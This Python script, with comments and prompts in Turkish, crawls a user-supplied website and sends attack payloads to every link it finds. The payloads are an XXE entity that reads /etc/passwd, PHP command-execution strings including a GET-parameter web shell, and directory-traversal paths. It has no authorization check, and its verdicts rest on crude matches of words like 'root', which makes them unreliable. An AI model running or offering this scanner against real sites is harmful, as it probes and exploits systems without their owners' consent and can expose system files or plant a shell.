import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

# XXE, RCE ve LFI yüklerini içeren örnek veriler
xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
"""

rce_payloads = [
    "<?php system('ls'); ?>",
    "<?php system($_GET['cmd']); ?>"
]

lfi_payloads = [
    "../../../../etc/passwd",
    "../../../../../etc/passwd"
]

def get_all_urls(url):
    urls = set()
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.content, "html.parser")
        for a_tag in soup.findAll("a", href=True):
            href = a_tag.attrs["href"]
            if not urlparse(href).netloc:
                href = urljoin(url, href)
            if urlparse(href).netloc == urlparse(url).netloc:
                urls.add(href)
    except Exception as e:
        print(f"Hata oluştu: {e}")
    return urls

def scan_xxe_vulnerability(url):
    headers = {'Content-Type': 'application/xml'}
    response = requests.post(url, data=xxe_payload, headers=headers)
    
    if "root:" in response.text:
        print(f"[!] Potansiyel XXE Açığı Bulundu: {url}")
    else:
        print(f"[+] Güvenli: {url}")

def scan_rce_vulnerability(url):
    for payload in rce_payloads:
        response = requests.post(url, data=payload)
        if "bin" in response.text or "root" in response.text:
            print(f"[!] Potansiyel RCE Açığı Bulundu: {url} ({payload})")
        else:
            print(f"[+] Güvenli: {url} ({payload})")

def scan_lfi_vulnerability(url):
    for payload in lfi_payloads:
        full_url = f"{url}/{payload}"
        response = requests.get(full_url)
        if "root:" in response.text:
            print(f"[!] Potansiyel LFI Açığı Bulundu: {full_url}")
        else:
            print(f"[+] Güvenli: {full_url}")

def main():
    base_url = input("Lütfen taranacak web sitesinin URL'sini girin (örn: http://example.com): ")
    if not urlparse(base_url).scheme:
        base_url = "http://" + base_url
    
    urls = get_all_urls(base_url)
    print(f"{len(urls)} URL bulundu. Tarama başlıyor...")
    
    for url in urls:
        print(f"Taranıyor: {url}")
        scan_xxe_vulnerability(url)
        scan_rce_vulnerability(url)
        scan_lfi_vulnerability(url)

if __name__ == "__main__":
    main()
